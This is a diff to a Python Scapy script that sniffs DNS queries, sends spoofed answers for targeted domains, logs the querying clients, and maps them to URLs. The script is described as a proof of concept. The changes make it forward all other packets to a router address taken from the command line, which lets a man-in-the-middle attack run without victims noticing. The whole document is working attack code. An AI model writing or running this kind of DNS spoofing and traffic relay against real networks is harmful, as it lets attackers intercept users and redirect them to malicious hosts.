@@ -34,7 +34,7 @@ def load_urls() -> Dict[str, str]:
 # Configuration
 URLS = load_urls()
 SPOOF_IP = "127.0.0.1"        # IP to redirect to (localhost for PoC)
-MAPPER = ClientMapper(dns_process=True)
+MAPPER: ClientMapper
 
 def dns_spoof(pkt: Any) -> None:
     """
@@ -44,6 +44,9 @@ def dns_spoof(pkt: Any) -> None:
     Description: Analyzes DNS queries and sends spoofed responses for targeted domains,
                 recording the attempt and mapping client information
     """
+    
+    router_ip = sys.argv[4]
+    
     # Check if packet is a DNS query
     if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:  # type: ignore
         qname = pkt[DNSQR].qname.decode().rstrip(".")  # type: ignore
@@ -71,6 +74,12 @@ def dns_spoof(pkt: Any) -> None:
             record_entry(qname, build_dict_from_packet(pkt))
             #print("Asked to recorded entry")
             MAPPER.add_client(srcip, URLS[qname])  # type: ignore
+        else:
+            pkt[IP].dst = router_ip #type:ignore
+            sendp(pkt,verbose=0)
+    else:
+        pkt[IP].dst = router_ip #type:ignore
+        sendp(pkt,verbose=0)
 
 def build_dict_from_packet(pkt: Any) -> Dict[str, str]:
     """
@@ -86,7 +95,10 @@ def build_dict_from_packet(pkt: Any) -> Dict[str, str]:
 
 if __name__ == "__main__":
     # Sniff DNS packets
+    
+    
     print(f"Sniffing DNS queries for {URLS}...")
+    MAPPER = ClientMapper()
     while True:
         # Update sniffing list every 5 seconds
         
